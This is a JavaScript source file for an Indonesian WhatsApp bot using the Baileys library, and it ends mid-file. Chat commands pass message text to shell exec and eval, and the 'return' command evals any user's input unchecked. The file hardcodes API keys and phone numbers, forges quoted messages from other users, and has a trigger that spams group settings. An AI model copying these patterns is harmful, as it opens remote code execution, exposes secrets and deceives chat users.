const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const { color, bgcolor } = require('./lib/color')
const { help } = require('./src/help')
const { info } = require('./src/info')
const { pe } = require('./src/Pe')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, success, close } = require('./lib/functions')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const fs = require('fs') 
const moment = require('moment-timezone')
const { exec } = require('child_process')
const kagApi = require('@kagchi/kag-api')
const fetch = require('node-fetch')
const {y2mateA, y2mateV} = require('./plugins/y2mate.js')
const {lirikLagu} = require('./plugins/lirik.js')
const {mediafireDl} = require('./plugins/mediafire.js')
const {dafontSearch, dafontDown} = require('./plugins/dafont.js')
const {covid} = require('./plugins/covid.js')
const {fotoIg, videoIg} = require('./plugins/ig.js')
const {fbDown} = require('./plugins/fb.js')
const {convertSticker} = require("./plugins/swm.js")
const yts = require('yt-search') 
const monospace = '```'
const googleImage = require('g-i-s')
const ggs = require('google-it')
const cheerio = require('cheerio') 
const tiktod = require('tiktok-scraper')
const ffmpeg = require('fluent-ffmpeg')
const util = require('util')
const axios = require('axios')
const { removeBackgroundFromImageFile } = require('remove.bg')
const imgbb = require('imgbb-uploader')
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilenk = JSON.parse(fs.readFileSync('./src/antilink.json'))
const simin = JSON.parse(fs.readFileSync('./src/simi.json'))
const vcard = 'BEGIN:VCARD\n' // ANAK ANJING MAU NGAPAIN?
            + 'VERSION:3.0\n' // NGAPAIN LAGI KALO GA MAU NUMPANG NAMA DOANG XIXIXIXI
            + 'FN:StepenTitid\n' // MENDING LU TOBAT SU!
            + 'ORG:Creator Z-PlerXBOT;\n' // KASIH CREDITS GUA SU!!!
            + 'TEL;type=CELL;type=VOICE;waid=62815150192842:+62 815-1501-92846\n' // JANGAN KEK BABI SU
            + 'END:VCARD'
prefix = `+`
statz = 'ONLINE'
  let _uptime = process.uptime() * 1000
  let uptime = clockString(_uptime)
blocked = []
dz = '*DONASI YA ASU!*'
dp = '*NIH GAN!*'
br = '*INGFO² INGFOKAN CUY*'
cr = '*GAK BISA BHASA ENGGRES*'
nomcr = `0@s.whatsapp.net`

function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
} 
 function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return `${h} 'jam' ${m} 'menit' ${s} 'detik'`
}

async function starts() {
	const client = new WAConnection()
	client.logger.level = 'warn'
	console.log(banner.string)
	client.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan QR nya bang'))
	})
	client.on('credentials-updated', () => {
		fs.writeFileSync('./login.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
		info('2', 'Login Info Updated')
	})
	fs.existsSync('./login.json') && client.loadAuthInfo('./login.json')
	client.on('connecting', () => {
		start('2', 'Connecting...')
	})
	client.on('open', () => {
		success('2', 'Connected! LessGooo👉😁👈')
	})
	await client.connect({timeoutMs: 30*1000})

	client.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
			const mdata = await client.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group *${mdata.subject}* Yang betah ya disini🖤`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await client.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Semoga Tenang Di Alam Sana @${num.split('@')[0]}👋`
				let buff = await getBuffer(ppimg)
				client.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		}catch(e) { 
			console.log('Error : %s', color(e, 'red'))
		}
	})
	client.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	client.on('message-new', async (mek) => {
		try { 
			if (!mek.message) return 
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return 
			global.prefix 
			global.blocked 
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const apiKey = '7728hhgsYRTtjah2837' 
			const lolApi = 'ae0184cfdb19e8c46728a104'
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const speed = require('performance-now')
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix) 

			mess = {
				wait: 'Loading Slurr ⌛',
				success: 'Udah Slur ✔️',
				error: {
					stick: '*Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker*',
					Iv: '❌ Link ga bisa slurr ❌'
				},
				only: {
					group: '❌ Perintah ini hanya bisa dipake di group slurd! ❌',
					ownerG: '❌ Perintah ini hanya bisa dipake sama owner group! ❌',
					ownerB: '❌ Perintah ini hanya bisa dipake sama owner bot! ❌',
					admin: '❌ Perintah ini hanya bisa dipake sama admin group! ❌',
					Badmin: '❌ Perintah ini hanya bisa dipake kalo bot jadi admin! ❌'
				}
			}

			const botNumber = client.user.jid
			const ownerNumber = client.user.jid // replace this with your number
			const adminbotnumber = ["62815150192842@s.whatsapp.net"]
			const frendsowner = ["628111917083@s.whatsapp.net", "62895337035454@s.whatsapp.net", "6285831440175@s.whatsapp.net", "6285807107404@s.whatsapp.net", "994407324213@s.whatsapp.net", "62815150192840@s.whatsapp.net", "62815150192842@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isAntiLink = isGroup ? antilenk.includes(from) : false 
			const isSimi = simin.includes(from)
			const isBot = botNumber.includes(sender)
			const isOwner = ownerNumber.includes(sender)
			const isadminbot = adminbotnumber.includes(sender)
			const isfrendsowner = frendsowner.includes(sender) 
			const tekt = mek.message.conversation
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				client.sendMessage(from, teks, text, {quoted:mek}) 
				}
	
			const fakeReply = (teks, target, teks2) => {

client.sendMessage(from, teks, text, {quoted: {key: {fromMe: false, participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: teks2}}})

}
const sendFileFromUrl = async(link, type, options) => {
  const hasil = await getBuffer(link)
	client.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	client.sendMessage(from, hasil, type, options).catch(e => {
	client.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	})
	})
	})
	})
	} 
	const sendFileFromStorage = (path, type, options) => {
client.sendMessage(from, fs.readFileSync(path), type, options).catch(e => {
reply('_[ ! ] Error Gagal Dalam Mengirim Media_')
console.log(e)
})
} 
const catalogReply = (teks, judul) => {
client.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { "productMessage": {
						"product": {
							"productImage": {
								"url": "https://mmg.whatsapp.net/d/f/Aq79TJ_z-SGqMNDVQVnX3Fmd8zu5nVEGndksF2pYx76e.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "Kv3xDPpFzppzRJS/9FyGtKyc6cdiJQ9kzM5lHJsxyIU=",
								"fileLength": "28573",
								"height": 720,
								"width": 720,
								"mediaKey": "IklNeUriGHykMLbj6YmcwYdG077n8ZY/xpQvRLFpWjQ=",
								"fileEncSha256": "UfukNZz3ad26fOvx1V/3YfwaUOg6ECv6YPz7RtSfH/o=",
								"directPath": "/v/t62.7118-24/19057636_968913973941883_3292179979991379577_n.enc?ccb=11-4&oh=52da57dc2b14287d7fb137047d1a55fb&oe=60B367D0",
								"mediaKeyTimestamp": "1620030467",
								"jpegThumbnail": fs.readFileSync('./StevenTs Logo.png')
							},
							"productId": "4083976448331261",
							"title": judul,
							"currencyCode": "IDR",
							"priceAmount1000": "9999999999",
							"productImageCount": 1
						},
						"businessOwnerJid": "6281515019284@s.whatsapp.net"
					}
				}
			}
		}
	)

	} 
const swReply = (teks, teks2) => {

			client.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: `WhatsApp Bot
This is a list of commands⬇️`, jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})

			}
			const downloadM = async(save) => {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
if (save) return await client.downloadAndSaveMediaMessage(encmedia)
return await client.downloadMediaMessage(encmedia)
  }
			const sendMess = (hehe, teks) => {
				client.sendMessage(hehe, teks, text)
			}
			const costum = (pesan, tipe, target, target2) => {
			     client.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			} 
			//Auto Reply by StepenTs 
			if (budy.includes(`Kontol`)) {
				let pelerd = fs.readFileSync('./stk/STK-20210123-WA0604.webp')
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'Bejird sloer', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})
				} 
			if (budy.includes(`kontol`)) {
				let pelerd = fs.readFileSync('./stk/STK-20210123-WA0604.webp')
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'Bejird sloer', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})
				} 
			if (budy.includes(`KONTOL`)) {
				let pelerd = fs.readFileSync('./stk/STK-20210123-WA0628.webp')
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'Fak', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})
				} 
			if (budy.includes(`desah`)) {
				tol = fs.readFileSync('./Yoi.mp3')
client.sendMessage(from, tol, audio, {mimetype: 'audio/mp4', ptt: true, filename: `Waduh`})
				} 
			if (budy.startsWith('$')){ 
				var konsol = budy.slice(1) 
				if (!mek.key.fromMe) return fakeReply('Fitur ini hanya untuk owner❌', 0, konsol)
				exec(konsol, (err, stdout) => { 
					if(err) return reply(`${err}`) 
					if (stdout) { 
						reply(`${stdout}`) 
				} 
			}) 
		}
			if (budy.includes(`✓`)) { 
				if (!isGroup) return fakeReply(mess.only.group, 0, 'Error')
				if (!isBot) return fakeReply('Kesian', 0, 'Fitur ini hanya untuk owner')
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 
client.toggleDisappearingMessages(from, 'entah') 

}
			if (budy.includes('Ngentot')) {
				let pelerd = fs.readFileSync('./stk/STK-20210123-WA0930.webp') 
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'F', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}}) 
				} 
			if (budy.includes('ngentot')) {
				let pelerd = fs.readFileSync('./stk/STK-20210123-WA0930.webp') 
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'F', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}}) 
				}
			if (budy.includes('NGENTOT')) {
				let pelerd = fs.readFileSync('./stk/2740.webp') 
				client.sendMessage(from, pelerd, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'F', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}}) 
				}

			colors = ['red','white','black','blue','yellow','green']
			const isMedia = (type === 'imageMessage' || type === 'videoMessage')
			const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
			const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
			const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage') 
			const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
			const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
			if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
			if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mRECV\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length)) 
			 switch(command) {
				case 'help':
				case 'menu':
					swReply(help(prefix))
					break
				case 'info':
					swReply(info(prefix))
					break 
				case 'shutdown':
if (!isOwner) return fakeReply('Hmmm', 0, `Mau ngapain tod?`)
reply('Shutdown In 3 Second....') 
setTimeout( () => {
client.sendMessage(from, '_3 Detik lagi…_', text)
					}, 500) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_2 Detik lagi_…', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					fakeReply('_1 LetssGoo👉😁👈_', 0, 'Loading…') // ur cods
					}, 2000) // 1000 = 1s,
setTimeout( () => {
client.close() }, 3000)
break
				case '>':
if (!mek.key.fromMe && !isfrendsowner) return
var konsol = args.join(' ')
function _return(sul) {
var sat = JSON.stringify(sul, null, 2)
var bang = util.format(sat)
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch (e) {
  err = String(e)
  reply(err)
}
break
                case '$':
if (!mek.key.fromMe && !isfrendsowner) return 
const cod = args.join(' ')
exec(cod, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(`${stdout}`)
}
})
break
                 case 'return':

				try {

					return client.sendMessage(from, JSON.stringify(eval(args.join('')), null, '\t'), text, { quoted: mek })

					} catch(e) {

					reply(`Error: ${e}`)

					}

					break
				case 'swm':
if (type === 'imageMessage' || isQuotedImage){
teks = args.join(' ')
var pack = teks.split("|")[0];
var author = teks.split("|")[1];
const getbuff = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const dlfile = await client.downloadMediaMessage(getbuff)
reply(mess.wait)
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
client.sendMessage(from, imageBuffer, MessageType.sticker, {quoted: mek})
} else {
reply('Format Salah!')
}
break
				case 'ocr':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						reply(mess.wait)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja mas')
					}
					break 
				case 'stiker':
				case 'sticker':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								client.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						reply(mess.wait)
						await ffmpeg(`./${media}`)
							.inputFormat(media.split('.')[1])
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								tipe = media.endsWith('.mp4') ? 'video' : 'gif'
								reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker slurd`)
							})
							.on('end', function () {
								console.log('Finish')
								buff = fs.readFileSync(ran)
								client.sendMessage(from, buff, sticker, {quoted: mek})
								fs.unlinkSync(media)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)
					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ranw = getRandom('.webp')
						ranp = getRandom('.png')
						reply(mess.wait)
						keyrmbg = 'bcAvZyjYAjKkp1cmK8ZgQvWH'
						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg.result, size: 'auto', type: 'auto', ranp}).then(res => {
							fs.unlinkSync(media)
							let buffer = Buffer.from(res.base64img, 'base64')
							fs.writeFileSync(ranp, buffer, (err) => {
								if (err) return reply('Gagal, Terjadi kesalahan, silahkan coba nanti ya slurr.')
							})
							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
								fs.unlinkSync(ranp)
								if (err) return reply(mess.error.stick)
								buff = fs.readFileSync(ranw)
								costum(buff, sticker, nomcr, dp)
							})
						})
					/*} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.on('start', function (cmd) {
								console.log('Started :', cmd)
							})
							.on('error', function (err) {
								fs.unlinkSync(media)
								console.log('Error :', err)
							})
							.on('end', function () {
								console.log('Finish')
								fs.unlinkSync(media)
								buff = fs.readFileSync(ran)
								costum(buff, sticker, nomcr, dp)
								fs.unlinkSync(ran)
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])
							.toFormat('webp')
							.save(ran)*/
					} else {
						reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim slurr`)
					}
					break
					//Update dowoader keknya sih 
					case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `▣╾╼╾╼𝗠𝗲𝗱𝗶𝗮𝗙𝗶𝗿𝗲͜͡࿐╾╼╾╼▣
┣➤ *Judul:* ${res[0].nama}
┣➤ *Link:* ${res[0].link}
┣➤ *Size:* ${res[0].size}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


*Mengupload File.......*

_*Harap tunggu dan jangan spam⚠️*_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break 
case 'dafontdown':
if (args.length < 1) return fakeReply('Error', 0, 'Mana linknya bang')
if(!isUrl(args[0]) && !args[0].includes('dafont')) return reply(mess.error.Iv)
teks = args.join(' ')
res = await dafontDown(teks) 
result = `▣╾╼╾╼𝗗𝗮𝗙𝗼𝗻𝘁╾╼╾╼▣
┣➤ *Judul:* ${res[0].judul}
┣➤ *Isi File:* ${res[0].isi}
┣➤ *Style:* ${res[0].style}
┣➤ *Filename:* ${res[0].output}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣`
reply(result)
sendFileFromUrl(res[0].down, document, {mimetype: 'font/ttf', filename: res[0].output, quoted: mek})
break
case 'dafontsearch':
case 'dafonts':
if (args.length < 1) return fakeReply('Error', 0, 'Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
res = await dafontSearch(teks)
a = res[0]
result = `▣╾╼╾╼𝗗𝗮𝗙𝗼𝗻𝘁╾╼╾╼▣
┣➤ *Judul:* ${a.judul}
┣➤ *Link:* ${a.link}
┣➤ *Style:* ${a.style}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣
`
reply(result)
break 
case 'facebook':
case 'fb':
if (args.length < 1) return fakeReply('Error', 0, 'Apa Yang Mau Dicari?')
if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply(mess.error.Iv)
teks = args.join(' ')
reply(mess.wait)
res = await fbDown(teks).catch(e => {
  reply('_[ ! ] Error Terjadi Kesalahan Dalam Memasuki Web Atau Link Error_')
})
a = res[0]
result = `▣╾╼╾╼𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸╾╼╾╼▣
┣➤ *Judul:* ${a.judul}
┣➤ *Source:* ${a.source}
┣➤ *Size:* ${a.size}
┣➤ *Format:* ${a.type}
┣➤ *Filename:* ${a.judul}.${a.type}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣
`
sendFileFromUrl(a.thumb, image, {caption: result, quoted: mek})
sendFileFromUrl(a.link, video, { mimetype: 'video/mp4',quoted: mek, filename: `${a.judul}.${a.type}`})
break
case 'ig':
case 'instagram':
if (args.length < 1) return fakeReply('Error', 0, 'Apa Yang Mau Dicari?')
